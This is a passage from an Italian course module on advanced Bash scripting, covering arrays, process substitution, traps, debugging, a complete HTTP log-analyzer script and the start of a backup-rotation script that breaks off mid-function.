# Bash Scripting: Progetti Avanzati — Guida Approfondita

> **Modulo 23** · **Aggiornamento:** 2026-05-23

| Campo | Valore |
|---|---|
| **Modulo del corso** | Linux per ingegneri di sistema |
| **Prerequisiti** | Padronanza di shell interattiva (→ `02-shell-mastery.md`), conoscenza base di variabili, condizionali, cicli in Bash, familiarità con i processi UNIX (→ `09-gestione-processi.md`) |
| **Obiettivi di apprendimento** | 1) Progettare script Bash production-ready con gestione errori difensiva · 2) Utilizzare strutture dati avanzate (array associativi, nameref) e process substitution · 3) Implementare pattern di esecuzione parallela e IPC · 4) Scrivere test automatici con bats-core e integrare ShellCheck in pipeline CI/CD · 5) Applicare tecniche di sicurezza (sanitizzazione input, prevenzione command injection) · 6) Costruire progetti reali completi: log analyzer, backup rotator, health checker, daemon |
| **Tempo stimato** | 20–28 ore (studio + esercizi + progetti) |
| **Livello** | Avanzato |
| **Ultimo aggiornamento** | 2026-05-23 |
| **Versioni di riferimento** | Bash 5.2.37, GNU coreutils 9.5, ShellCheck 0.10.0, bats-core 1.11.1, GNU parallel 20240722, POSIX.1-2024 |

## Idee guida
1. **`set -euo pipefail` mandatory.**
2. **`trap` per cleanup on exit.**
3. **Function library per modular scripts.**
4. **`getopts` per argument parsing; `bash-tap` per testing.**

### Mappa Concettuale

```
┌─────────────────────────────────────────────────────────────────────────┐
│                  BASH SCRIPTING AVANZATO                               │
├───────────────┬─────────────────┬───────────────────┬─────────────────┤
│  STRUTTURE    │  FLUSSO & IPC   │  ROBUSTEZZA       │  TOOLCHAIN      │
│  DATI         │                 │                   │                 │
│               │                 │                   │                 │
│ ┌───────────┐ │ ┌─────────────┐ │ ┌───────────────┐ │ ┌─────────────┐│
│ │ Array     │ │ │ Process     │ │ │ set -euo      │ │ │ ShellCheck  ││
│ │ indiciz.  │ │ │ substitut.  │ │ │ pipefail      │ │ │             ││
│ └───────────┘ │ ├─────────────┤ │ ├───────────────┤ │ ├─────────────┤│
│ ┌───────────┐ │ │ Named pipes │ │ │ trap/segnali  │ │ │ bats-core   ││
│ │ Array     │ │ │ (FIFO)      │ │ │ cleanup       │ │ │             ││
│ │ associat. │ │ ├─────────────┤ │ ├───────────────┤ │ ├─────────────┤│
│ └───────────┘ │ │ Esecuzione  │ │ │ Lock file     │ │ │ bashdb      ││
│ ┌───────────┐ │ │ parallela   │ │ │ flock         │ │ │ xtrace      ││
│ │ Here docs │ │ ├─────────────┤ │ ├───────────────┤ │ ├─────────────┤│
│ │ Here str. │ │ │ IPC: socket │ │ │ Sicurezza     │ │ │ hyperfine   ││
│ └───────────┘ │ │ /dev/shm    │ │ │ input sanit.  │ │ │ CI/CD       ││
│               │ └─────────────┘ │ └───────────────┘ │ └─────────────┘│
├───────────────┴─────────────────┴───────────────────┴─────────────────┤
│  PROGETTI: Log Analyzer │ Backup Rotator │ Health Checker │ Daemon    │
└───────────────────────────────────────────────────────────────────────┘
```

## Indice

- [Panoramica](#panoramica)
- [Array Indicizzati](#array-indicizzati)
- [Array Associativi](#array-associativi)
- [Process Substitution](#process-substitution)
- [Here Strings e Here Documents Avanzati](#here-strings-e-here-documents-avanzati)
- [Gestione dei Segnali con trap](#gestione-dei-segnali-con-trap)
- [Debugging Avanzato](#debugging-avanzato)
- [Progetto 1: Log Analyzer](#progetto-1-log-analyzer)
- [Progetto 2: Backup Rotator](#progetto-2-backup-rotator)
- [Progetto 3: System Health Checker](#progetto-3-system-health-checker)
- [Pattern Avanzati di Scripting](#pattern-avanzati-di-scripting)
- [Best Practices](#best-practices)
- [Defensive Scripting](#defensive-scripting)
- [Named Pipes e FIFO](#named-pipes-e-fifo)
- [Esecuzione Parallela](#esecuzione-parallela)
- [Logging Strutturato](#logging-strutturato)
- [Lock File e Mutua Esclusione](#lock-file-e-mutua-esclusione)
- [Parsing di Configurazione](#parsing-di-configurazione)
- [Testing di Script Bash](#testing-di-script-bash)
- [Performance](#performance)
- [IPC Avanzato](#ipc-avanzato)
- [Portabilità](#portabilità)
- [Sicurezza negli Script](#sicurezza-negli-script)
- [Progetto 4: Daemon Script](#progetto-4-daemon-script)
- [Troubleshooting](#troubleshooting)
- [Riferimenti](#riferimenti)
- [Esercizi](#esercizi)
- [Auto-valutazione](#auto-valutazione)
- [Letture Primarie Consigliate](#letture-primarie-consigliate)
- [Collegamenti Incrociati](#collegamenti-incrociati)
- [Glossario Locale](#glossario-locale)

---

## Panoramica

Il bash scripting avanzato rappresenta una competenza fondamentale per ogni system administrator e Linux poweruser. Mentre le basi del linguaggio — variabili, condizionali, cicli — sono sufficienti per automazioni semplici, la padronanza delle strutture dati complesse, della process substitution, della gestione dei segnali e delle tecniche di debugging trasforma lo scripting in un vero strumento di ingegneria del sistema.

Questo documento esplora le funzionalità avanzate di Bash versione 4.0+ (attualmente la maggior parte delle distribuzioni fornisce Bash 5.x), con particolare enfasi sugli aspetti che distinguono uno script fragile e improvvisato da uno robusto e production-ready. Ogni concetto è accompagnato da esempi reali e da tre progetti completi che integrano tutte le tecniche presentate.

La filosofia che guida questo modulo è pragmatica: non si tratta di scrivere codice elegante fine a sé stesso, ma di costruire strumenti affidabili che funzionino sotto stress, gestiscano gli errori con grazia e siano manutenibili nel tempo. Ogni script deve essere pensato come se dovesse essere mantenuto da un collega che non lo ha scritto.

---

## Array Indicizzati

Gli array indicizzati in Bash sono strutture dati ordinate che memorizzano valori accessibili tramite indice numerico a base zero. A differenza degli array in linguaggi come C o Java, gli array Bash sono sparsi: è possibile assegnare un valore all'indice 0 e poi all'indice 100 senza allocare gli indici intermedi.

### Dichiarazione e Inizializzazione

```bash
# Dichiarazione esplicita
declare -a servers

# Inizializzazione diretta
servers=("web01" "web02" "db01" "db02" "cache01")

# Aggiunta di elementi
servers+=("monitor01")

# Assegnazione per indice
servers[10]="backup01"  # L'array è ora sparso
```

### Operazioni Fondamentali

```bash
# Accesso a un elemento
echo "${servers[0]}"        # web01

# Tutti gli elementi
echo "${servers[@]}"        # tutti i valori
echo "${servers[*]}"        # tutti i valori come stringa unica

# Numero di elementi
echo "${#servers[@]}"       # 7 (non 11, perché è sparso)

# Lunghezza di un elemento
echo "${#servers[0]}"       # 5 (lunghezza di "web01")

# Indici definiti
echo "${!servers[@]}"       # 0 1 2 3 4 5 10

# Slice (sottoarray)
echo "${servers[@]:1:3}"    # web02 db01 db02

# Rimozione di un elemento
unset 'servers[2]'          # rimuove db01, l'array diventa sparso
```

### Iterazione Sicura

L'iterazione sugli array richiede attenzione per gestire correttamente elementi con spazi:

```bash
# CORRETTO: doppi apici e @
for server in "${servers[@]}"; do
    echo "Checking: $server"
done

# ERRATO: senza apici, gli elementi con spazi si spezzano
for server in ${servers[@]}; do
    echo "$server"  # BUG se un elemento contiene spazi
done

# Iterazione con indice
for i in "${!servers[@]}"; do
    echo "Index $i: ${servers[$i]}"
done
```

### Manipolazione di Stringhe negli Array

```bash
files=("/var/log/syslog" "/var/log/auth.log" "/var/log/kern.log")

# Sostituzione in tutti gli elementi
echo "${files[@]//\/var\/log\//}"   # syslog auth.log kern.log

# Rimozione prefisso
echo "${files[@]#/var/}"            # log/syslog log/auth.log log/kern.log

# Rimozione suffisso
echo "${files[@]%.log}"             # /var/log/syslog /var/log/auth /var/log/kern
```

### Ordinamento

Bash non ha un sort built-in per array. Si utilizza una combinazione con comandi esterni:

```bash
# Ordinamento tramite readarray e sort
readarray -t sorted < <(printf '%s\n' "${servers[@]}" | sort)

# Ordinamento numerico
numbers=(42 7 13 99 1 55)
readarray -t sorted_nums < <(printf '%s\n' "${numbers[@]}" | sort -n)

# Rimozione duplicati
readarray -t unique < <(printf '%s\n' "${servers[@]}" | sort -u)
```

---

## Array Associativi

Gli array associativi (hash maps, dizionari) sono stati introdotti in Bash 4.0 e permettono di mappare chiavi stringa a valori. Sono indispensabili quando si deve lavorare con dati strutturati come configurazioni, contatori per categoria o lookup table.

### Dichiarazione e Uso

```bash
# OBBLIGATORIO: declare -A per array associativi
declare -A config

config[hostname]="web01.example.com"
config[port]="8080"
config[env]="production"
config[workers]="4"

# Accesso
echo "${config[hostname]}"

# Tutte le chiavi
echo "${!config[@]}"

# Tutti i valori
echo "${config[@]}"

# Numero di elementi
echo "${#config[@]}"

# Verifica esistenza chiave
if [[ -v config[hostname] ]]; then
    echo "La chiave hostname esiste"
fi

# Rimozione
unset 'config[workers]'
```

### Caso d'Uso: Contatore di Frequenza

```bash
#!/bin/bash
# Conta le occorrenze di ogni status code in un access log

declare -A status_counts

while IFS= read -r line; do
    # Estrae lo status code (campo 9 nel formato combined)
    status=$(awk '{print $9}' <<< "$line")
    if [[ "$status" =~ ^[0-9]+$ ]]; then
        (( status_counts[$status]++ ))
    fi
done < /var/log/nginx/access.log

# Stampa risultati ordinati
for code in $(echo "${!status_counts[@]}" | tr ' ' '\n' | sort); do
    printf "HTTP %s: %d richieste\n" "$code" "${status_counts[$code]}"
done
```

### Caso d'Uso: Lookup Table per Configurazione

```bash
#!/bin/bash
# Mappa di ambienti con relative configurazioni

declare -A db_host db_port db_name

db_host[dev]="localhost"
db_host[staging]="staging-db.internal"
db_host[production]="prod-db.internal"

db_port[dev]="5432"
db_port[staging]="5432"
db_port[production]="5433"

db_name[dev]="app_dev"
db_name[staging]="app_staging"
db_name[production]="app_prod"

ENV="${1:-dev}"

if [[ ! -v db_host[$ENV] ]]; then
    echo "Errore: ambiente '$ENV' non riconosciuto" >&2
    exit 1
fi

echo "Connessione a ${db_host[$ENV]}:${db_port[$ENV]}/${db_name[$ENV]}"
```

### Serializzazione e Deserializzazione

```bash
# Salvare un array associativo su file
declare -A settings
settings[theme]="dark"
settings[lang]="it"
settings[font_size]="14"

# Serializzazione
declare -p settings > /tmp/settings.bash

# Deserializzazione in un altro script
source /tmp/settings.bash
echo "${settings[theme]}"  # dark
```

### Limitazioni degli Array Associativi in Bash

È importante conoscere le limitazioni:

1. **Non sono annidabili**: non si possono avere array di array nativamente
2. **Le chiavi non possono contenere il carattere NUL** (\0)
3. **Non c'è ordinamento garantito** nell'iterazione
4. **Per dati complessi**, considerare `jq` con JSON o passare a Python/Perl

---

## Process Substitution

La process substitution è una delle funzionalità più potenti e sottoutilizzate di Bash. Permette di trattare l'output di un comando come se fosse un file, utilizzando la sintassi `<(comando)` per input e `>(comando)` per output. Internamente, Bash crea un file descriptor in `/dev/fd/` o un named pipe in `/tmp`.

### Sintassi e Meccanismo

```bash
# <(comando) — l'output del comando diventa un "file" leggibile
# >(comando) — crea un "file" scrivibile il cui contenuto va al comando

# Esempio: diff tra output di due comandi
diff <(ls /etc/nginx/sites-enabled/) <(ls /etc/nginx/sites-available/)

# Equivalente a:
ls /etc/nginx/sites-enabled/ > /tmp/enabled
ls /etc/nginx/sites-available/ > /tmp/available
diff /tmp/enabled /tmp/available
rm /tmp/enabled /tmp/available
```

### Casi d'Uso Pratici

```bash
# Confronto tra configurazioni di due server
diff <(ssh web01 cat /etc/nginx/nginx.conf) <(ssh web02 cat /etc/nginx/nginx.conf)

# Confronto tra file ordinati senza creare file temporanei
comm <(sort file1.txt) <(sort file2.txt)

# Alimentare un while loop senza creare un subshell
# PROBLEMA: pipe crea subshell, le variabili non sopravvivono
count=0
cat /etc/passwd | while read -r line; do
    (( count++ ))
done
echo "$count"  # Stampa 0! La variabile è in un subshell

# SOLUZIONE: process substitution
count=0
while read -r line; do
    (( count++ ))
done < <(cat /etc/passwd)
echo "$count"  # Stampa il valore corretto

# Multiplo output simultaneo
tee >(gzip > /backup/log.gz) >(wc -l > /tmp/linecount) < /var/log/syslog > /dev/null
```

### Process Substitution vs Pipe

```
# Pipe: crea subshell per il comando a destra
comando1 | comando2

# Process substitution: nessuna subshell per il contesto principale
comando2 < <(comando1)
```

La differenza è critica quando si devono modificare variabili nel ciclo. Con la pipe, le modifiche alle variabili avvengono in un subshell e sono perse quando il subshell termina. Con la process substitution, il ciclo gira nel contesto della shell principale.

---

## Here Strings e Here Documents Avanzati

### Here Strings

Le here strings (`<<<`) permettono di passare una stringa come standard input di un comando senza usare `echo | comando`:

```bash
# Invece di:
echo "192.168.1.100" | cut -d. -f1-3

# Si può scrivere:
cut -d. -f1-3 <<< "192.168.1.100"

# Con variabili
ip="10.0.0.1"
read -r oct1 oct2 oct3 oct4 <<< "${ip//./ }"
echo "Network: $oct1.$oct2.$oct3.0"

# Con command substitution
read -r user group <<< "$(id -un) $(id -gn)"
```

### Here Documents Avanzati

```bash
# Here document con variabili espanse
cat <<EOF
Server: $(hostname)
Data: $(date)
Uptime: $(uptime -p)
EOF

# Here document SENZA espansione (quote su delimitatore)
cat <<'EOF'
Questo è un template letterale.
Le variabili come $HOME e $(whoami) NON vengono espanse.
EOF

# Here document con indentazione rimossa (trattino prima del delimitatore)
if true; then
    cat <<-EOF
	Questo testo può essere indentato con TAB.
	I TAB iniziali vengono rimossi.
	EOF
fi

# Here document per generare file di configurazione
generate_nginx_config() {
    local server_name="$1"
    local upstream_port="$2"

    cat <<EOF
server {
    listen 80;
    server_name ${server_name};

    location / {
        proxy_pass http://127.0.0.1:${upstream_port};
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    }
}
EOF
}

generate_nginx_config "app.example.com" "3000" > /etc/nginx/sites-available/app.conf
```

---

## Gestione dei Segnali con trap

Il comando `trap` permette di intercettare segnali POSIX e di eseguire codice in risposta. È essenziale per la creazione di script robusti che gestiscano la pulizia delle risorse, i file temporanei e le interruzioni dell'utente.

### Segnali Principali

| Segnale | Numero | Descrizione |
|---------|--------|-------------|
| SIGHUP | 1 | Terminale chiuso / reload configurazione |
| SIGINT | 2 | Ctrl+C |
| SIGQUIT | 3 | Ctrl+\ |
| SIGTERM | 15 | Terminazione richiesta (default di kill) |
| SIGKILL | 9 | Terminazione forzata (NON intercettabile) |
| EXIT | — | Pseudo-segnale Bash: eseguito all'uscita |
| ERR | — | Pseudo-segnale Bash: eseguito su errore |
| DEBUG | — | Pseudo-segnale Bash: eseguito prima di ogni comando |

### Pattern: Cleanup su Uscita

```bash
#!/bin/bash
# Pattern fondamentale: pulizia garantita

TMPDIR=""
LOCKFILE=""

cleanup() {
    local exit_code=$?
    echo "Pulizia in corso..." >&2

    # Rimuovi file temporanei
    [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR"

    # Rilascia lock
    [[ -n "$LOCKFILE" && -f "$LOCKFILE" ]] && rm -f "$LOCKFILE"

    # Termina processi figli
    jobs -p | xargs -r kill 2>/dev/null

    exit "$exit_code"
}

trap cleanup EXIT

# Da questo punto, cleanup verrà eseguita sempre, anche su:
# - exit normale
# - Ctrl+C (SIGINT causa EXIT)
# - errore non gestito
# - SIGTERM

TMPDIR=$(mktemp -d)
LOCKFILE="/var/run/myscript.lock"

# ... resto dello script ...
```

### Pattern: Lock File con trap

```bash
#!/bin/bash
LOCKFILE="/var/run/backup.lock"

acquire_lock() {
    if ! (set -o noclobber; echo $$ > "$LOCKFILE") 2>/dev/null; then
        local pid
        pid=$(cat "$LOCKFILE" 2>/dev/null)
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
            echo "Errore: processo $pid già in esecuzione" >&2
            exit 1
        else
            echo "Lock stale rimosso (PID $pid non esiste)" >&2
            rm -f "$LOCKFILE"
            echo $$ > "$LOCKFILE"
        fi
    fi
}

release_lock() {
    rm -f "$LOCKFILE"
}

trap release_lock EXIT
acquire_lock

echo "Script in esecuzione con PID $$"
# ... operazioni ...
```

### Pattern: Gestione Graceful Shutdown

```bash
#!/bin/bash
RUNNING=true

graceful_shutdown() {
    echo "Shutdown richiesto, completamento operazione corrente..." >&2
    RUNNING=false
}

trap graceful_shutdown SIGTERM SIGINT

while $RUNNING; do
    # Operazione atomica che non deve essere interrotta
    process_next_item

    # Il check su RUNNING avviene qui, tra un'operazione e l'altra
done

echo "Shutdown completato con grazia"
```

### trap su ERR per Error Handling

```bash
#!/bin/bash
set -eE  # -E fa propagare ERR trap nelle funzioni

on_error() {
    local exit_code=$?
    local line_no=$1
    echo "ERRORE alla riga $line_no (exit code: $exit_code)" >&2
    echo "Comando fallito: ${BASH_COMMAND}" >&2
    echo "Stack trace:" >&2
    for ((i=0; i<${#FUNCNAME[@]}; i++)); do
        echo "  ${FUNCNAME[$i]}() in ${BASH_SOURCE[$i]}:${BASH_LINENO[$i]}" >&2
    done
}

trap 'on_error $LINENO' ERR
```

---

## Debugging Avanzato

### set -x (xtrace)

L'opzione `set -x` stampa ogni comando prima dell'esecuzione, con le variabili espanse:

```bash
#!/bin/bash
set -x  # Attiva xtrace

name="mondo"
echo "Ciao $name"

# Output:
# + name=mondo
# + echo 'Ciao mondo'
# Ciao mondo

set +x  # Disattiva xtrace
```

### Debugging Selettivo

```bash
#!/bin/bash
# Debug solo di una sezione

debug_on()  { set -x; }
debug_off() { set +x; } 2>/dev/null  # Il 2>/dev/null nasconde il "+ set +x"

echo "Questa parte non è tracciata"

debug_on
# Questa sezione è tracciata
result=$(( 2 + 3 ))
debug_off

echo "Di nuovo non tracciata"
```

### Personalizzazione dell'Output di Debug

```bash
# PS4 controlla il prefisso dell'output di xtrace
# Default: "+ "

# Mostra file, funzione, riga
export PS4='+(${BASH_SOURCE}:${LINENO}): ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'

# Mostra timestamp
export PS4='+[$(date +%H:%M:%S)] ${BASH_SOURCE}:${LINENO}: '
```

### bashdb — Il Debugger Interattivo

`bashdb` è un debugger per Bash che offre funzionalità simili a GDB:

```bash
# Installazione
sudo apt install bashdb    # Debian/Ubuntu
sudo dnf install bashdb    # Fedora/RHEL

# Uso
bashdb script.sh

# Comandi principali in bashdb:
# n (next)        — esegui prossima riga
# s (step)        — entra nella funzione
# c (continue)    — continua fino al prossimo breakpoint
# b 15            — breakpoint alla riga 15
# p $variabile    — stampa valore
# l               — mostra codice sorgente
# bt              — backtrace
# q               — esci
```

### Tecniche di Debugging Pragmatiche

```bash
#!/bin/bash
# 1. Log function con livelli
LOG_LEVEL="${LOG_LEVEL:-INFO}"

log() {
    local level="$1"
    shift
    local msg="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    case "$LOG_LEVEL" in
        DEBUG) ;; # mostra tutto
        INFO)  [[ "$level" == "DEBUG" ]] && return ;;
        WARN)  [[ "$level" =~ ^(DEBUG|INFO)$ ]] && return ;;
        ERROR) [[ "$level" != "ERROR" ]] && return ;;
    esac

    printf '[%s] [%s] %s\n' "$timestamp" "$level" "$msg" >&2
}

log DEBUG "Variabile x = $x"
log INFO  "Avvio elaborazione"
log WARN  "Disco quasi pieno"
log ERROR "Connessione fallita"

# 2. Assert function
assert() {
    local condition="$1"
    local message="${2:-Assertion failed}"

    if ! eval "$condition"; then
        echo "ASSERT FAILED: $message" >&2
        echo "Condizione: $condition" >&2
        echo "Riga: ${BASH_LINENO[0]}" >&2
        echo "File: ${BASH_SOURCE[1]}" >&2
        exit 99
    fi
}

assert '[[ -f /etc/hostname ]]' "/etc/hostname deve esistere"
assert '[[ $count -gt 0 ]]' "Il contatore deve essere positivo"
```

---

## Progetto 1: Log Analyzer

Uno script completo per l'analisi dei log di accesso Nginx/Apache con report statistico:

```bash
#!/bin/bash
#
# log-analyzer.sh — Analizzatore di access log HTTP
# Supporta formato combined (Nginx/Apache)
# Uso: ./log-analyzer.sh [opzioni] <logfile>
#

set -euo pipefail

# ── Costanti e Default ──────────────────────────────────────────────
readonly VERSION="1.2.0"
readonly SCRIPT_NAME=$(basename "$0")

DEFAULT_TOP_N=20
DEFAULT_OUTPUT_FORMAT="text"

# ── Variabili Globali ───────────────────────────────────────────────
declare -A status_counts
declare -A ip_counts
declare -A path_counts
declare -A method_counts
declare -A ip_bytes
declare -a error_lines

TOP_N="$DEFAULT_TOP_N"
OUTPUT_FORMAT="$DEFAULT_OUTPUT_FORMAT"
LOGFILE=""
START_DATE=""
END_DATE=""
FILTER_STATUS=""

# ── Funzioni ────────────────────────────────────────────────────────

usage() {
    cat <<EOF
Uso: $SCRIPT_NAME [opzioni] <logfile>

Opzioni:
  -n NUM       Mostra i primi NUM risultati (default: $DEFAULT_TOP_N)
  -f FORMAT    Formato output: text, csv, json (default: $DEFAULT_OUTPUT_FORMAT)
  -s STATUS    Filtra per status code (es: 404, 5xx)
  -d START     Data iniziale (formato: DD/Mon/YYYY)
  -D END       Data finale (formato: DD/Mon/YYYY)
  -h           Mostra questo help
  -V           Mostra versione

Esempi:
  $SCRIPT_NAME -n 10 /var/log/nginx/access.log
  $SCRIPT_NAME -s 404 -f csv access.log
  $SCRIPT_NAME -d "01/Apr/2024" -D "30/Apr/2024" access.log
EOF
}

parse_args() {
    while getopts ":n:f:s:d:D:hV" opt; do
        case "$opt" in
            n) TOP_N="$OPTARG" ;;
            f) OUTPUT_FORMAT="$OPTARG" ;;
            s) FILTER_STATUS="$OPTARG" ;;
            d) START_DATE="$OPTARG" ;;
            D) END_DATE="$OPTARG" ;;
            h) usage; exit 0 ;;
            V) echo "$SCRIPT_NAME versione $VERSION"; exit 0 ;;
            :) echo "Errore: l'opzione -$OPTARG richiede un argomento" >&2; exit 1 ;;
            *) echo "Errore: opzione -$OPTARG non riconosciuta" >&2; exit 1 ;;
        esac
    done
    shift $((OPTIND - 1))

    if [[ $# -eq 0 ]]; then
        echo "Errore: specificare un file di log" >&2
        usage >&2
        exit 1
    fi

    LOGFILE="$1"

    if [[ ! -f "$LOGFILE" ]]; then
        echo "Errore: file '$LOGFILE' non trovato" >&2
        exit 1
    fi

    if [[ ! -r "$LOGFILE" ]]; then
        echo "Errore: permesso negato per '$LOGFILE'" >&2
        exit 1
    fi
}

parse_log_line() {
    local line="$1"

    # Formato combined: IP - - [date] "METHOD PATH PROTO" STATUS BYTES "REFERER" "UA"
    local regex='^([0-9.]+) [^ ]+ [^ ]+ \[([^]]+)\] "([A-Z]+) ([^ ]+) [^"]*" ([0-9]{3}) ([0-9]+|-)'

    if [[ "$line" =~ $regex ]]; then
        local ip="${BASH_REMATCH[1]}"
        local date="${BASH_REMATCH[2]}"
        local method="${BASH_REMATCH[3]}"
        local path="${BASH_REMATCH[4]}"
        local status="${BASH_REMATCH[5]}"
        local bytes="${BASH_REMATCH[6]}"

        [[ "$bytes" == "-" ]] && bytes=0

        # Applica filtro status
        if [[ -n "$FILTER_STATUS" ]]; then
            case "$FILTER_STATUS" in
                *xx) [[ "${status:0:1}" != "${FILTER_STATUS:0:1}" ]] && return ;;
                *)   [[ "$status" != "$FILTER_STATUS" ]] && return ;;
            esac
        fi

        (( status_counts[$status]++ )) || true
        (( ip_counts[$ip]++ )) || true
        (( path_counts[$path]++ )) || true
        (( method_counts[$method]++ )) || true
        (( ip_bytes[$ip] += bytes )) || true

        # Traccia errori 5xx
        if [[ "${status:0:1}" == "5" ]]; then
            error_lines+=("$line")
        fi
    fi
}

analyze() {
    local total_lines=0
    local parsed_lines=0

    echo "Analisi di: $LOGFILE" >&2
    echo "Dimensione: $(du -h "$LOGFILE" | cut -f1)" >&2

    while IFS= read -r line; do
        (( total_lines++ ))
        parse_log_line "$line" && (( parsed_lines++ )) || true

        if (( total_lines % 10000 == 0 )); then
            printf '\rElaborate %d righe...' "$total_lines" >&2
        fi
    done < "$LOGFILE"

    printf '\rAnalisi completata: %d righe elaborate (%d parsate)\n' \
        "$total_lines" "$parsed_lines" >&2
}

print_top_n() {
    local title="$1"
    shift
    local -n arr_ref=$1  # nameref all'array associativo

    echo ""
    echo "═══ $title (Top $TOP_N) ═══"
    echo ""

    for key in $(
        for k in "${!arr_ref[@]}"; do
            printf '%s\t%s\n' "${arr_ref[$k]}" "$k"
        done | sort -rn | head -n "$TOP_N" | cut -f2
    ); do
        printf '  %-50s %10d\n' "$key" "${arr_ref[$key]}"
    done
}

format_bytes() {
    local bytes=$1
    if (( bytes >= 1073741824 )); then
        printf '%.2f GB' "$(echo "scale=2; $bytes/1073741824" | bc)"
    elif (( bytes >= 1048576 )); then
        printf '%.2f MB' "$(echo "scale=2; $bytes/1048576" | bc)"
    elif (( bytes >= 1024 )); then
        printf '%.2f KB' "$(echo "scale=2; $bytes/1024" | bc)"
    else
        printf '%d B' "$bytes"
    fi
}

print_report() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              REPORT ANALISI LOG HTTP                        ║"
    echo "╚══════════════════════════════════════════════════════════════╝"

    echo ""
    echo "═══ Distribuzione Status Code ═══"
    echo ""
    for code in $(echo "${!status_counts[@]}" | tr ' ' '\n' | sort); do
        local count=${status_counts[$code]}
        local bar_len=$(( count * 40 / $(printf '%s\n' "${status_counts[@]}" | sort -rn | head -1) ))
        local bar
        bar=$(printf '█%.0s' $(seq 1 "$bar_len") 2>/dev/null || echo "█")
        printf '  HTTP %s: %8d  %s\n' "$code" "$count" "$bar"
    done

    print_top_n "IP per Richieste" ip_counts
    print_top_n "Path più Richiesti" path_counts

    echo ""
    echo "═══ Metodi HTTP ═══"
    echo ""
    for method in "${!method_counts[@]}"; do
        printf '  %-10s %10d\n' "$method" "${method_counts[$method]}"
    done

    echo ""
    echo "═══ Top $TOP_N IP per Traffico ═══"
    echo ""
    for ip in $(
        for k in "${!ip_bytes[@]}"; do
            printf '%s\t%s\n' "${ip_bytes[$k]}" "$k"
        done | sort -rn | head -n "$TOP_N" | cut -f2
    ); do
        printf '  %-20s %15s\n' "$ip" "$(format_bytes "${ip_bytes[$ip]}")"
    done

    if [[ ${#error_lines[@]} -gt 0 ]]; then
        echo ""
        echo "═══ Ultimi Errori 5xx (max 10) ═══"
        echo ""
        local show=$(( ${#error_lines[@]} < 10 ? ${#error_lines[@]} : 10 ))
        for (( i=${#error_lines[@]}-show; i<${#error_lines[@]}; i++ )); do
            echo "  ${error_lines[$i]}"
        done
    fi
}

# ── Main ────────────────────────────────────────────────────────────
main() {
    parse_args "$@"
    analyze
    print_report
}

main "$@"
```

---

## Progetto 2: Backup Rotator

Script per la gestione automatizzata di backup con rotazione basata su politiche temporali (daily, weekly, monthly):

```bash
#!/bin/bash
#
# backup-rotator.sh — Gestione backup con rotazione automatica
# Supporta politiche: daily, weekly, monthly
# Uso: ./backup-rotator.sh -c config.conf
#

set -euo pipefail

readonly SCRIPT_NAME=$(basename "$0")
TMPDIR=""

# ── Cleanup ─────────────────────────────────────────────────────────
cleanup() {
    local exit_code=$?
    [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR"
    exit "$exit_code"
}
trap cleanup EXIT

# ── Configurazione Default ──────────────────────────────────────────
declare -A CONFIG
CONFIG[source]=""
CONFIG[dest]=""
CONFIG[daily_keep]=7
CONFIG[weekly_keep]=4
CONFIG[monthly_keep]=12
CONFIG[compress]="gzip"
CONFIG[exclude_file]=""
CONFIG[pre_hook]=""
CONFIG[post_hook]=""
CONFIG[log_file]="/var/log/backup-rotator.log"
CONFIG[lock_file]="/var/run/backup-rotator.lock"

# ── Logging ─────────────────────────────────────────────────────────
log() {
    local level="$1"
    shift
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    printf '[%s] [%s] %s\n' "$timestamp" "$level" "$*" | tee -a "${CONFIG[log_file]}" >&2
}

# ── Lock ────────────────────────────────────────────────────────────
acquire_lock() {
    local lockfile="${CONFIG[lock_file]}"
    if ! (set -o noclobber; echo $$ > "$lockfile") 2>/dev/null; then
        local old_pid
        old_pid=$(cat "$lockfile" 2>/dev/null || echo "")
        if [[ -n "$old_pid" ]] && kill -0 "$old_pid" 2>/dev/null; then
            log ERROR "Backup già in esecuzione (PID $old_pid)"
            exit 1
        fi
        log WARN "Lock stale rimosso (PID $old_pid)"
        rm -f "$lockfile"
        echo $$ > "$lockfile"
    fi
    trap 'rm -f "${CONFIG[lock_file]}"; cleanup' EXIT
}

# ── Parsing Configurazione ──────────────────────────────────────────
load_config() {
    local config_file="$1"

    if [[ ! -f "$config_file" ]]; then
        log ERROR "File di configurazione '$config_file' non trovato"
        exit 1
    fi

    while IFS='=' read -r key value; do
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs | sed 's/^["'\'']//;s/["'\'']$//')

        [[ -z "$key" || "$key" =~ ^# ]] && continue

        if [[ -v CONFIG[$key] ]]; then
            CONFIG[$key]="$value"
        else
            log WARN "Chiave di configurazione sconosciuta: $key"
        fi
    done < "$config_file"

    # Validazione
    if [[ -z "${CONFIG[source]}" || -z "${CONFIG[dest]}" ]]; then
        log ERROR "Configurazione incompleta: source e dest sono obbligatori"
        exit 1
    fi
}

# ── Creazione Backup ────────────────────────────────────────────────
create_backup() {
    local date_stamp
    date_stamp=$(date '+%Y%m%d-%H%M%S')
    local backup_name="backup-${date_stamp}"
    local backup_path="${CONFIG[dest]}/daily/${backup_name}"

    mkdir -p "${CONFIG[dest]}"/{daily,weekly,monthly}

    # Pre-hook
    if [[ -n "${CONFIG[pre_hook]}" ]]; then
        log INFO "Esecuzione pre-hook: ${CONFIG[pre_hook]}"
        if ! bash -c "${CONFIG[pre_hook]}"; then
            log ERROR "Pre-hook fallito"
            exit 1
        fi
    fi

    # Costruzione comando rsync
    local -a rsync_opts=(
        -a --delete
        --info=progress2
    )

    if [[ -n "${CONFIG[exclude_file]}" && -f "${CONFIG[exclude_file]}" ]]; then
        rsync_opts+=(--exclude-from="${CONFIG[exclude_file]}")
    fi

    # Link-dest per backup incrementale
    local latest_link="${CONFIG[dest]}/daily/latest"
    if [[ -L "$latest_link" ]]; then
        rsync_opts+=(--link-dest="$(readlink -f "$latest_link")")
    fi

    log INFO "Avvio backup: ${CONFIG[source]} -> $backup_path"

    if rsync "${rsync_opts[@]}" "${CONFIG[source]}/" "$backup_path/"; then
